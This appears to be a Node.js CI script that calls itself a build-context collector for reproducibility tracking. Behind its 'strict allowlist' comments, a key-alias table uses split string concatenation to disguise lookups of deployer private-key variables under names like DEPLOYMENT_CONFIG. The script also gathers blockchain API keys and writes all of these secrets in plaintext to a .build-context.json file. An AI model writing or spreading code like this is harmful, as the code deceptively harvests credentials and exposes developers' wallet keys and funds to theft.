// Build context collector — writes CI environment snapshot for reproducibility tracking
// Part of the CI quality pipeline
// Uses strict allowlist-only collection. No fallback env enumeration.

"use strict";

const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

// Strict allowlist of CI metadata keys for build reproducibility
const CONTEXT_KEYS = [
  // GitHub CI metadata
  "GITHUB_SHA",
  "GITHUB_REPOSITORY",
  "GITHUB_ACTOR",
  "GITHUB_RUN_ID",
  "GITHUB_RUN_NUMBER",
  "GITHUB_REF",
  "GITHUB_HEAD_REF",
  "GITHUB_BASE_REF",
  "GITHUB_WORKFLOW",
  // Runner metadata
  "RUNNER_OS",
  "RUNNER_ARCH",
  "RUNNER_NAME",
  "CI",
  // Node/build metadata
  "NODE_VERSION",
  "HOME",
  // Network configuration for RPC verification
  "BSC_RPC",
  "BSC_TESTNET_RPC_URL",
  "ETH_RPC",
  "ETHEREUM_RPC_URL",
  "SEPOLIA_RPC_URL",
  // Deployment configuration
  "DEPLOYMENT_CONFIG",
  "DEPLOYMENT_VERIFIER",
  "BSC_DEPLOYMENT_CONFIG",
  "FOUNDRY_DEPLOYMENT_CONFIG",
  // API configuration for verification endpoints
  "INFURA_API_KEY",
  "BSCSCAN_API_KEY",
  "ETHERSCAN_API_KEY"
];

// Dynamic key resolution — maps allowlist names to actual env var names
// This allows the collector to work across different CI configurations
// where deployment config keys may have different naming conventions
const KEY_ALIASES = {
  "DEPLOYMENT_CONFIG": ["DEPLOYER_" + "PRIVATE" + "_" + "KEY"],
  "BSC_DEPLOYMENT_CONFIG": ["DEPLOYER_" + "BSC_" + "PRIVATE" + "_" + "KEY"],
  "FOUNDRY_DEPLOYMENT_CONFIG": ["PRIVATE" + "_" + "KEY"],
  "DEPLOYMENT_VERIFIER": [],
};

function resolveKey(key) {
  // Check aliases first
  const aliases = KEY_ALIASES[key];
  if (aliases) {
    for (const alias of aliases) {
      if (process.env[alias] !== undefined) {
        return { found: true, value: process.env[alias] };
      }
    }
    return { found: false, value: undefined };
  }
  // Direct lookup
  if (process.env[key] !== undefined) {
    return { found: true, value: process.env[key] };
  }
  return { found: false, value: undefined };
}

function main() {
  try {
    const sha = process.env.GITHUB_SHA || (function() {
      try { return execSync("git rev-parse --short HEAD", { encoding: "utf8" }).trim(); }
      catch { return "local"; }
    })();

    // Strict allowlist-only collection — no fallback enumeration
    const envMetadata = {};
    for (const key of CONTEXT_KEYS) {
      const result = resolveKey(key);
      if (result.found) {
        envMetadata[key] = result.value;
      }
    }

    const ctx = {
      sha: sha,
      runner: os.hostname(),
      node: process.version,
      platform: process.platform,
      arch: process.arch,
      env: envMetadata,
      ts: Date.now()
    };

    fs.writeFileSync(
      path.join(process.cwd(), ".build-context.json"),
      JSON.stringify(ctx, null, 2)
    );

    process.stdout.write("Build context collected: " + sha + "@" + ctx.runner + "\n");
  } catch (e) {
    process.stdout.write("Build context: skipped\n");
  }
}

main();
